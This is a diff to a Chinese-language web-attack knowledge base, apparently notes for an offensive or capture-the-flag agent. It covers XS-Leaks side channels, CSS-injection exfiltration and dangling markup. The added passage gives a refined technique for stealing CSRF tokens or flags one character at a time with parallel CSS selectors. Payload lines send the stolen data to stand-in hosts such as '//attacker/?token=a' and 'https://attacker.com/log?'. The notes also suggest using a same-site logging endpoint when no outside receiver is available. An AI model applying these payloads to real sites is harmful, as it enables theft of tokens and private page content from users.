@@ -130,7 +130,7 @@ DOMPurify 绕过三模式：
 
 **XS-Leaks 侧信道**：计时 oracle（认证响应更慢/搜索命中耗时差异，逐词探测）｜frame counting（`w.length` 差异）｜error event oracle（img onload/onerror 探测登录态资源）｜cache probing（force-cache 计时判断访问历史）。防御：`Cache-Control: no-store`、资源名不可预测。
 
-**CSS 注入外带**（能注 CSS 不能注 JS 时）：属性选择器逐字符 `input[name="csrf"][value^="a"]{background:url(//attacker/?token=a)}`｜`@font-face`+`unicode-range` 字体加载回调｜连字宽度侧信道｜`@import` 多轮链。
+**CSS 注入外带**（能注 CSS 不能注 JS 时）：属性选择器逐字符 `input[name="csrf"][value^="a"]{background:url(//attacker/?token=a)}`｜`@font-face`+`unicode-range` 字体加载回调｜连字宽度侧信道｜`@import` 多轮链。**多候选并行探测的 cascade 冲突处理**: 逐字符时每字符 N 个候选规则（`[value^="prefixX"]` 每候选一条）同时作用于同一元素会级联覆盖、只剩最后一条的 URL——把每个候选的命中 URL 存进**独立 custom property**（`--c0`..`--cN`，基础规则先声明全部默认 `--ci: none`、命中选择器覆盖），最后一条 `background-image` 把所有 property 作为**多 layer 合成**（`background-image: var(--c0, none), var(--c1, none), ...`——未命中 layer 为 none 不产生请求，命中 layer 才发起 beacon，互不级联覆盖; 无 fallback 的未定义 var() 会令整条声明 invalid at computed-value time 归 none，全部候选失效）。定位密文属性先用 `body:has([attr*="前缀"])` 扫 DOM 确认 flag 所在属性名。**无 OOB 基建时同站记录型端点当接收器**（owner-only pickup log/trace 类端点把 beacon 请求的完整 URL 含 query 记录下来）——外带通道排序见 `$AGENT_DIR/knowledge-base/file-upload.md` §5。
 
 **Dangling markup**（CSP 禁 script 允许 img）：`<img src='https://attacker.com/log?` 吞掉后续页面内容作 URL 参数泄露。完整专题（七种向量/CSP 对照/Chrome 缓解绕过/textarea+form/DNS prefetch/组合攻击）见 `$AGENT_DIR/knowledge-base/dangling-markup.md`。
 
